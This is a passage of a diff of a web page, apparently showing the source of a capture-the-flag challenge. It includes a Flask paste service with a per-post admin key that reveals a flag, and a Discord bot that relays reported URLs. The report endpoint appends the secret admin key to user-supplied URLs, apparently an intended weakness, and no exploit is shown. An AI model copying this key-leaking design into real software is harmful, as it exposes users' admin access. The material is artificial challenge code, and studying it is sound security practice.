-</span></span><span style="display:flex;"><span>RECAPTCHA_SITE_KEY <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;6LfIGcYeAAAAAHRPxzy0PC5eyujDK45OW_B_q60w&#34;</span>
-</span></span><span style="display:flex;"><span>PROJECT_ID <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;1075927595652&#34;</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_redis_conn</span>(db):
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> redis<span style="color:#f92672">.</span>Redis(host<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;redis&#39;</span>, port<span style="color:#f92672">=</span><span style="color:#ae81ff">6379</span>, db<span style="color:#f92672">=</span>db)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">verify_recaptcha</span>(token):
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> RECAPTCHA_SECRET <span style="color:#f92672">is</span> <span style="color:#66d9ef">None</span>:
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    body <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>dumps({
-</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;event&#34;</span>: {
-</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;token&#34;</span>: token,
-</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;siteKey&#34;</span>: RECAPTCHA_SITE_KEY
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>    })<span style="color:#f92672">.</span>encode()
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
-</span></span><span style="display:flex;"><span>        data <span style="color:#f92672">=</span> urllib<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>urlopen(
-</span></span><span style="display:flex;"><span>            urllib<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>Request(
-</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;https://recaptchaenterprise.googleapis.com/v1beta1/projects/</span><span style="color:#e6db74">{</span>PROJECT_ID<span style="color:#e6db74">}</span><span style="color:#e6db74">/assessments?key=</span><span style="color:#e6db74">{</span>RECAPTCHA_SECRET<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>,
-</span></span><span style="display:flex;"><span>                headers<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#39;Content-Type&#39;</span>: <span style="color:#e6db74">&#39;application/json&#39;</span>},
-</span></span><span style="display:flex;"><span>                data<span style="color:#f92672">=</span>body
-</span></span><span style="display:flex;"><span>            )
-</span></span><span style="display:flex;"><span>        )<span style="color:#f92672">.</span>read()
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span>:
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    result <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>loads(data)
-</span></span><span style="display:flex;"><span>    score <span style="color:#f92672">=</span> result<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;score&#34;</span>, <span style="color:#ae81ff">0</span>)
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">assert</span> isinstance(score, float) <span style="color:#f92672">or</span> isinstance(score, int)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> score
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># utils</span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">b64digest</span>(b):
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> base64<span style="color:#f92672">.</span>urlsafe_b64encode(b)<span style="color:#f92672">.</span>strip(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;=&#34;</span>)<span style="color:#f92672">.</span>decode()
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_key</span>(id):
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">assert</span> isinstance(id, str)
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> b64digest(hashlib<span style="color:#f92672">.</span>sha256((APP_KEY <span style="color:#f92672">+</span> id)<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>digest())[:<span style="color:#ae81ff">10</span>]
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># flask</span>
-</span></span><span style="display:flex;"><span>app <span style="color:#f92672">=</span> flask<span style="color:#f92672">.</span>Flask(__name__)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app</span><span style="color:#f92672">.</span>route(<span style="color:#e6db74">&#34;/&#34;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;GET&#34;</span>])
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">index</span>():
-</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&#34;&#34;Home&#34;&#34;&#34;</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> flask<span style="color:#f92672">.</span>render_template(
-</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;index.html&#34;</span>,
-</span></span><span style="display:flex;"><span>        is_post<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>,
-</span></span><span style="display:flex;"><span>        title<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Create Paste&#34;</span>,
-</span></span><span style="display:flex;"><span>        sitekey<span style="color:#f92672">=</span>RECAPTCHA_SITE_KEY
-</span></span><span style="display:flex;"><span>    )
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app</span><span style="color:#f92672">.</span>route(<span style="color:#e6db74">&#34;/post/&lt;string(length=16):id&gt;&#34;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;GET&#34;</span>])
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_post</span>(id):
-</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&#34;&#34;Read a ticket&#34;&#34;&#34;</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Get ticket by ID</span>
-</span></span><span style="display:flex;"><span>    content <span style="color:#f92672">=</span> get_redis_conn(DB_TICKET)<span style="color:#f92672">.</span>get(id)
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> content <span style="color:#f92672">is</span> <span style="color:#66d9ef">None</span>:
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> flask<span style="color:#f92672">.</span>abort(<span style="color:#ae81ff">404</span>, <span style="color:#e6db74">&#34;not found&#34;</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Check if admin</span>
-</span></span><span style="display:flex;"><span>    content <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>loads(content)
-</span></span><span style="display:flex;"><span>    key <span style="color:#f92672">=</span> flask<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;key&#34;</span>)
-</span></span><span style="display:flex;"><span>    is_admin <span style="color:#f92672">=</span> isinstance(key, str) <span style="color:#f92672">and</span> get_key(id) <span style="color:#f92672">==</span> key
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> flask<span style="color:#f92672">.</span>render_template(
-</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;index.html&#34;</span>,
-</span></span><span style="display:flex;"><span>        <span style="color:#f92672">**</span>content,
-</span></span><span style="display:flex;"><span>        is_post<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>,
-</span></span><span style="display:flex;"><span>        panel<span style="color:#f92672">=</span><span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;&#34;&#34;
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;strong&gt;Hello admin! Your flag is: </span><span style="color:#e6db74">{</span>FLAG<span style="color:#e6db74">}</span><span style="color:#e6db74">&lt;/strong&gt;&lt;br&gt;
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;form id=&#34;delete-form&#34; method=&#34;post&#34; action=&#34;/api/delete&#34;&gt;
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &lt;input name=&#34;id&#34; type=&#34;hidden&#34; value=&#34;</span><span style="color:#e6db74">{</span>id<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;&gt;
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &lt;input name=&#34;key&#34; type=&#34;hidden&#34; value=&#34;</span><span style="color:#e6db74">{</span>key<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;&gt;
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &lt;button id=&#34;modal-button-delete&#34; type=&#34;button&#34;&gt;Delete This Post&lt;/button&gt;
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;/form&gt;
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span> <span style="color:#66d9ef">if</span> is_admin <span style="color:#66d9ef">else</span> <span style="color:#e6db74">&#34;&#34;</span>,
-</span></span><span style="display:flex;"><span>        url<span style="color:#f92672">=</span>flask<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>url,
-</span></span><span style="display:flex;"><span>        sitekey<span style="color:#f92672">=</span>RECAPTCHA_SITE_KEY
-</span></span><span style="display:flex;"><span>    )
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app</span><span style="color:#f92672">.</span>route(<span style="color:#e6db74">&#34;/api/new&#34;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;POST&#34;</span>])
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">api_new</span>():
-</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&#34;&#34;Create a new ticket&#34;&#34;&#34;</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Get parameters</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
-</span></span><span style="display:flex;"><span>        title <span style="color:#f92672">=</span> flask<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>form[<span style="color:#e6db74">&#34;title&#34;</span>]
-</span></span><span style="display:flex;"><span>        content <span style="color:#f92672">=</span> flask<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>form[<span style="color:#e6db74">&#34;content&#34;</span>]
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span>:
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> flask<span style="color:#f92672">.</span>abort(<span style="color:#ae81ff">400</span>, <span style="color:#e6db74">&#34;Invalid request&#34;</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Register a new ticket</span>
-</span></span><span style="display:flex;"><span>    id <span style="color:#f92672">=</span> b64digest(os<span style="color:#f92672">.</span>urandom(<span style="color:#ae81ff">16</span>))[:<span style="color:#ae81ff">16</span>]
-</span></span><span style="display:flex;"><span>    get_redis_conn(DB_TICKET)<span style="color:#f92672">.</span>set(
-</span></span><span style="display:flex;"><span>        id, json<span style="color:#f92672">.</span>dumps({<span style="color:#e6db74">&#34;title&#34;</span>: title, <span style="color:#e6db74">&#34;content&#34;</span>: content})
-</span></span><span style="display:flex;"><span>    )
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> flask<span style="color:#f92672">.</span>jsonify({<span style="color:#e6db74">&#34;result&#34;</span>: <span style="color:#e6db74">&#34;OK&#34;</span>,
-</span></span><span style="display:flex;"><span>                          <span style="color:#e6db74">&#34;message&#34;</span>: <span style="color:#e6db74">&#34;Post created! Click here to see your post&#34;</span>,
-</span></span><span style="display:flex;"><span>                          <span style="color:#e6db74">&#34;action&#34;</span>: <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>flask<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>url_root<span style="color:#e6db74">}</span><span style="color:#e6db74">post/</span><span style="color:#e6db74">{</span>id<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>})
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app</span><span style="color:#f92672">.</span>route(<span style="color:#e6db74">&#34;/api/delete&#34;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;POST&#34;</span>])
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">api_delete</span>():
-</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&#34;&#34;Delete a ticket&#34;&#34;&#34;</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Get parameters</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
-</span></span><span style="display:flex;"><span>        id <span style="color:#f92672">=</span> flask<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>form[<span style="color:#e6db74">&#34;id&#34;</span>]
-</span></span><span style="display:flex;"><span>        key <span style="color:#f92672">=</span> flask<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>form[<span style="color:#e6db74">&#34;key&#34;</span>]
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span>:
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> flask<span style="color:#f92672">.</span>abort(<span style="color:#ae81ff">400</span>, <span style="color:#e6db74">&#34;Invalid request&#34;</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> get_key(id) <span style="color:#f92672">!=</span> key:
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> flask<span style="color:#f92672">.</span>abort(<span style="color:#ae81ff">401</span>, <span style="color:#e6db74">&#34;Unauthorized&#34;</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Delete</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> get_redis_conn(DB_TICKET)<span style="color:#f92672">.</span>delete(id) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> flask<span style="color:#f92672">.</span>jsonify({<span style="color:#e6db74">&#34;result&#34;</span>: <span style="color:#e6db74">&#34;NG&#34;</span>, <span style="color:#e6db74">&#34;message&#34;</span>: <span style="color:#e6db74">&#34;Post not found&#34;</span>})
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> flask<span style="color:#f92672">.</span>jsonify({<span style="color:#e6db74">&#34;result&#34;</span>: <span style="color:#e6db74">&#34;OK&#34;</span>, <span style="color:#e6db74">&#34;message&#34;</span>: <span style="color:#e6db74">&#34;This post was successfully deleted&#34;</span>})
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app</span><span style="color:#f92672">.</span>route(<span style="color:#e6db74">&#34;/api/report&#34;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;POST&#34;</span>])
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">api_report</span>():
-</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&#34;&#34;Reoprt an invitation ticket&#34;&#34;&#34;</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Get parameters</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
-</span></span><span style="display:flex;"><span>        url <span style="color:#f92672">=</span> flask<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>form[<span style="color:#e6db74">&#34;url&#34;</span>]
-</span></span><span style="display:flex;"><span>        reason <span style="color:#f92672">=</span> flask<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>form[<span style="color:#e6db74">&#34;reason&#34;</span>]
-</span></span><span style="display:flex;"><span>        recaptcha_token <span style="color:#f92672">=</span> flask<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>form[<span style="color:#e6db74">&#34;g-recaptcha-response&#34;</span>]
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span>:
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> flask<span style="color:#f92672">.</span>abort(<span style="color:#ae81ff">400</span>, <span style="color:#e6db74">&#34;Invalid request&#34;</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Check reCAPTCHA</span>
-</span></span><span style="display:flex;"><span>    score <span style="color:#f92672">=</span> verify_recaptcha(recaptcha_token)
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> score <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>:
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> flask<span style="color:#f92672">.</span>jsonify({<span style="color:#e6db74">&#34;result&#34;</span>: <span style="color:#e6db74">&#34;NG&#34;</span>, <span style="color:#e6db74">&#34;message&#34;</span>: <span style="color:#e6db74">&#34;Recaptcha verify failed&#34;</span>})
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> score <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0.3</span>:
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> flask<span style="color:#f92672">.</span>jsonify({<span style="color:#e6db74">&#34;result&#34;</span>: <span style="color:#e6db74">&#34;NG&#34;</span>, <span style="color:#e6db74">&#34;message&#34;</span>: <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Bye robot (score: </span><span style="color:#e6db74">{</span>score<span style="color:#e6db74">}</span><span style="color:#e6db74">)&#34;</span>})
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Check URL</span>
-</span></span><span style="display:flex;"><span>    parsed <span style="color:#f92672">=</span> urllib<span style="color:#f92672">.</span>parse<span style="color:#f92672">.</span>urlparse(url<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;?&#39;</span>, <span style="color:#ae81ff">1</span>)[<span style="color:#ae81ff">0</span>])
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> len(parsed<span style="color:#f92672">.</span>query) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>:
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> flask<span style="color:#f92672">.</span>jsonify({<span style="color:#e6db74">&#34;result&#34;</span>: <span style="color:#e6db74">&#34;NG&#34;</span>, <span style="color:#e6db74">&#34;message&#34;</span>: <span style="color:#e6db74">&#34;Query string is not allowed&#34;</span>})
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>parsed<span style="color:#f92672">.</span>scheme<span style="color:#e6db74">}</span><span style="color:#e6db74">://</span><span style="color:#e6db74">{</span>parsed<span style="color:#f92672">.</span>netloc<span style="color:#e6db74">}</span><span style="color:#e6db74">/&#39;</span> <span style="color:#f92672">!=</span> flask<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>url_root:
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> flask<span style="color:#f92672">.</span>jsonify({<span style="color:#e6db74">&#34;result&#34;</span>: <span style="color:#e6db74">&#34;NG&#34;</span>, <span style="color:#e6db74">&#34;message&#34;</span>: <span style="color:#e6db74">&#34;Invalid host&#34;</span>})
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Parse path</span>
-</span></span><span style="display:flex;"><span>    adapter <span style="color:#f92672">=</span> app<span style="color:#f92672">.</span>url_map<span style="color:#f92672">.</span>bind(flask<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>host)
-</span></span><span style="display:flex;"><span>    endpoint, args <span style="color:#f92672">=</span> adapter<span style="color:#f92672">.</span>match(parsed<span style="color:#f92672">.</span>path)
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> endpoint <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;get_post&#34;</span> <span style="color:#f92672">or</span> <span style="color:#e6db74">&#34;id&#34;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> args:
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> flask<span style="color:#f92672">.</span>jsonify({<span style="color:#e6db74">&#34;result&#34;</span>: <span style="color:#e6db74">&#34;NG&#34;</span>, <span style="color:#e6db74">&#34;message&#34;</span>: <span style="color:#e6db74">&#34;Invalid endpoint&#34;</span>})
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Check ID</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> get_redis_conn(DB_TICKET)<span style="color:#f92672">.</span>exists(args[<span style="color:#e6db74">&#34;id&#34;</span>]):
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> flask<span style="color:#f92672">.</span>jsonify({<span style="color:#e6db74">&#34;result&#34;</span>: <span style="color:#e6db74">&#34;NG&#34;</span>, <span style="color:#e6db74">&#34;message&#34;</span>: <span style="color:#e6db74">&#34;Invalid ID&#34;</span>})
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    key <span style="color:#f92672">=</span> get_key(args[<span style="color:#e6db74">&#34;id&#34;</span>])
-</span></span><span style="display:flex;"><span>    message <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;URL: </span><span style="color:#e6db74">{</span>url<span style="color:#e6db74">}</span><span style="color:#e6db74">?key=</span><span style="color:#e6db74">{</span>key<span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Reason: </span><span style="color:#e6db74">{</span>reason<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
-</span></span><span style="display:flex;"><span>        get_redis_conn(DB_BOT)<span style="color:#f92672">.</span>rpush(
-</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#39;report&#39;</span>, message[:MESSAGE_LENGTH_LIMIT]
-</span></span><span style="display:flex;"><span>        )
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span>:
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> flask<span style="color:#f92672">.</span>jsonify({<span style="color:#e6db74">&#34;result&#34;</span>: <span style="color:#e6db74">&#34;NG&#34;</span>, <span style="color:#e6db74">&#34;message&#34;</span>: <span style="color:#e6db74">&#34;Post failed&#34;</span>})
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> flask<span style="color:#f92672">.</span>jsonify({<span style="color:#e6db74">&#34;result&#34;</span>: <span style="color:#e6db74">&#34;OK&#34;</span>, <span style="color:#e6db74">&#34;message&#34;</span>: <span style="color:#e6db74">&#34;Successfully reported&#34;</span>})
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
-</span></span><span style="display:flex;"><span>    app<span style="color:#f92672">.</span>run()
-</span></span></code></pre></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#75715e"># secret.py</span>
+<span style="color:#75715e"># Secret discord channel ID</span>
+LOGGING_CHANNEL_ID <span style="color:#f92672">=</span> <span style="color:#ae81ff">1337</span>
+<span style="color:#75715e"># Secret discord server</span>
+DISCORD_SECRET <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;XXXXYYYYZZZZ&#34;</span>
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#75715e"># crawler.py</span>
+<span style="color:#75715e">#!/usr/bin/env python3</span>
+<span style="color:#f92672">import</span> discord
+<span style="color:#f92672">import</span> redis
+
+<span style="color:#f92672">from</span> secret <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+DB_BOT <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+
+client <span style="color:#f92672">=</span> discord<span style="color:#f92672">.</span>Client()
+
+<span style="color:#a6e22e">@client</span><span style="color:#f92672">.</span>event
+<span style="color:#66d9ef">async</span> <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">on_ready</span>():
+    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;We&#39;ve logged in as </span><span style="color:#e6db74">{</span>client<span style="color:#f92672">.</span>user<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+    channel <span style="color:#f92672">=</span> client<span style="color:#f92672">.</span>get_channel(LOGGING_CHANNEL_ID)
+    <span style="color:#66d9ef">if</span> channel <span style="color:#f92672">is</span> <span style="color:#66d9ef">None</span>:
+        print(<span style="color:#e6db74">&#34;Failed to get channel...&#34;</span>)
+        exit(<span style="color:#ae81ff">1</span>)
+
+    c <span style="color:#f92672">=</span> redis<span style="color:#f92672">.</span>Redis(host<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;redis&#39;</span>, port<span style="color:#f92672">=</span><span style="color:#ae81ff">6379</span>, db<span style="color:#f92672">=</span>DB_BOT)
+    <span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
+        r <span style="color:#f92672">=</span> c<span style="color:#f92672">.</span>blpop(<span style="color:#e6db74">&#39;report&#39;</span>, <span style="color:#ae81ff">1</span>)
+        <span style="color:#66d9ef">if</span> r <span style="color:#f92672">is</span> <span style="color:#f92672">not</span> <span style="color:#66d9ef">None</span>:
+            key, value <span style="color:#f92672">=</span> r
+            <span style="color:#66d9ef">try</span>:
+                <span style="color:#66d9ef">await</span> channel<span style="color:#f92672">.</span>send(value<span style="color:#f92672">.</span>decode())
+            <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+                print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[ERROR] </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+
+client<span style="color:#f92672">.</span>run(DISCORD_SECRET)
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#75715e"># app.py</span>
+<span style="color:#75715e">#!/usr/bin/env python3</span>
+<span style="color:#f92672">import</span> base64
+<span style="color:#f92672">import</span> flask
+<span style="color:#f92672">import</span> hashlib
+<span style="color:#f92672">import</span> json
+<span style="color:#f92672">import</span> os
+<span style="color:#f92672">import</span> redis
+<span style="color:#f92672">import</span> urllib.parse
+<span style="color:#f92672">import</span> urllib.request
+
+<span style="color:#f92672">from</span> secret <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+MESSAGE_LENGTH_LIMIT <span style="color:#f92672">=</span> <span style="color:#ae81ff">2000</span>
+
+<span style="color:#75715e"># redis</span>
+DB_TICKET <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+DB_BOT <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+
+<span style="color:#75715e"># recaptcha</span>
+RECAPTCHA_SITE_KEY <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;6LfIGcYeAAAAAHRPxzy0PC5eyujDK45OW_B_q60w&#34;</span>
+PROJECT_ID <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;1075927595652&#34;</span>
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_redis_conn</span>(db):
+    <span style="color:#66d9ef">return</span> redis<span style="color:#f92672">.</span>Redis(host<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;redis&#39;</span>, port<span style="color:#f92672">=</span><span style="color:#ae81ff">6379</span>, db<span style="color:#f92672">=</span>db)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">verify_recaptcha</span>(token):
+    <span style="color:#66d9ef">if</span> RECAPTCHA_SECRET <span style="color:#f92672">is</span> <span style="color:#66d9ef">None</span>:
+        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>
+
+    body <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>dumps({
+        <span style="color:#e6db74">&#34;event&#34;</span>: {
+            <span style="color:#e6db74">&#34;token&#34;</span>: token,
+            <span style="color:#e6db74">&#34;siteKey&#34;</span>: RECAPTCHA_SITE_KEY
+        }
